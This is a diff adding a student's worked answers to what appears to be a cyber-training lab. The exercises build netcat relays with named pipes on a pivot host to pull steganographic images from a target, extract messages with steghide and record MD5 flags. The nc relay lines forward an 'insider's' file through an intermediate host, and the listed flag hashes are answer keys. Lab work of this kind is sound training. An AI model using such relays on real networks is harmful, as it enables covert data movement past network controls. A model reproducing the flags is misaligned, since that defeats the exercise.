@@ -2339,14 +2339,103 @@ cat phrase1.txt | md5sum
 
 
 
+Relay 2
+
+Utilize the targets T2 and RELAY to develop the following netcat relays for use by Gorgan Cyber Forces. The use of names pipes should be utilized on RELAY:
+
+Syntax for steghide tool:
+steghide extract -sf [image name]
+Passphrase: password
+
+    The Donovian Insider provided a image called 2steg.jpg on T2 and is trying to connect to RELAY on TCP port 4321 to send the file. Establish a Netcat relay on RELAY to accept this connection and forward to T1. Once the images are downloaded you will use a command-line tool called steghide to extract the message. Perform an MD5SUM on this message to create flag2.
+
+    File should be 70723 bytes in size. 
+
+
+
+Blue host:
+nc -lvp 1111 > 2steg 
+
+Relay:
+
+
+nc 10.10.0.40 1111 < mypipe | nc -lvp 4321 > mypipe
+
+
+
+
+bluehost:
+steghide extract -sf 2steg 
+cat phrase2.txt | md5sum
+
+024a1256e6f2ac6f08d2ccca2c3ba2a1
+
+
+
+Relay 3
+
+Utilize the targets T2 and RELAY to develop the following netcat relays for use by Gorgan Cyber Forces. The use of names pipes should be utilized on RELAY:
+
+Syntax for steghide tool:
+steghide extract -sf [image name]
+Passphrase: password
+
+    The Donovian Insider provided a image called 3steg.jpg on T2 listening for a connection from RELAY on TCP port 6789. Establish a Netcat relay on RELAY to make this connection and forward to T1. Once the images are downloaded you will use a command-line tool called steghide to extract the message. Perform an MD5SUM on this message to create flag3.
+
+    File should be 177444 bytes in size. 
+
+bluehost:
+
+nc -lvp 1111 > 3steg
+
+relay:
+
+nc 10.10.0.40 1111 < mypipe | nc 172.16.82.115 6789 > mypipe
+
+
+
+bluehost:
+
+steghide extract -sf 3steg 
+cat phrase3.txt | md5sum
+
+
+
+6fb3afb3a172f3605551c4ac05168a0c
+
+
+
+Relay 4
+
+
+Utilize the targets T2 and RELAY to develop the following netcat relays for use by Gorgan Cyber Forces. The use of names pipes should be utilized on RELAY:
+
+Syntax for steghide tool:
+steghide extract -sf [image name]
+Passphrase: password
+
+    The Donovian Insider provided a image called 4steg.jpg on T2 listening for a connection from RELAY on TCP port 9876. Establish a Netcat relay on RELAY to make this connection and forward to T1. Once the images are downloaded you will use a command-line tool called steghide to extract the message. Perform an MD5SUM on this message to create flag4.
+
+    File should be 204283 bytes in size. 
+
+bluehost
+nc -lvp 1111 > 4steg
+
+relay
+
+nc 10.10.0.40 1111 < mypipe | nc 172.16.82.115 9876 > mypipe
 
 
 
 
 
+bluehost
 
 
 
+steghide extract -sf 4steg 
+cat phrase4.txt | md5sum
 
 
 
+378ee6771aa1cbd9653479bfc7db819e
